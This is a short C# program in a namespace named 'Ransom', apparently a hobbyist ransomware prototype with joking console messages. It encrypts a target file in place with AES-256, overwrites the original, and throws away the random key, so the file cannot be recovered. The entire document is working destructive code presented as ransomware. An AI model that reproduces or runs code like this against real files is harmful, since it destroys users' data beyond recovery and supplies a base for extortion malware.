using System;
using System.IO;
using System.Security.Cryptography;

namespace Ransom
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Add an Path vroooo");
                return;
            }

            string filePath = args[0].Trim();

            if (!File.Exists(filePath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("File not found vroo");
                Console.ResetColor();
                return;
            }

            try
            {
                string tempFile = Path.GetTempFileName();

                using (Aes aes = Aes.Create())
                {
                    aes.KeySize = 256;
                    aes.GenerateKey();
                    aes.GenerateIV();

                    using (FileStream fsIn  = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read))
                    using (FileStream fsOut = new FileStream(tempFile, FileMode.Create, FileAccess.Write))
                    {
                        fsOut.Write(aes.IV, 0, aes.IV.Length);

                        using var cryptoStream = new CryptoStream(fsOut, aes.CreateEncryptor(), CryptoStreamMode.Write);

                        byte[] buffer = new byte[8192];
                        int bytesRead;

                        while ((bytesRead = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            cryptoStream.Write(buffer, 0, bytesRead);
                        }

                        cryptoStream.FlushFinalBlock();
                    }

                    File.Copy(tempFile, filePath, overwrite: true);
                }

                try { File.Delete(tempFile); } catch { }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Encrypted vrooo");
                Console.ResetColor();
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Vrooo r u even admin?");
                Console.WriteLine(ex.Message);
                Console.ResetColor();
            }
            catch (IOException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("access error vroo look at that");
                Console.WriteLine(ex.Message);
                Console.ResetColor();
            }
            catch (CryptographicException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("encryption error vrooo look at that");
                Console.WriteLine(ex.Message);
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("theres an error vrooo:");
                Console.WriteLine(ex.ToString());
                Console.ResetColor();
            }
        }
    }
}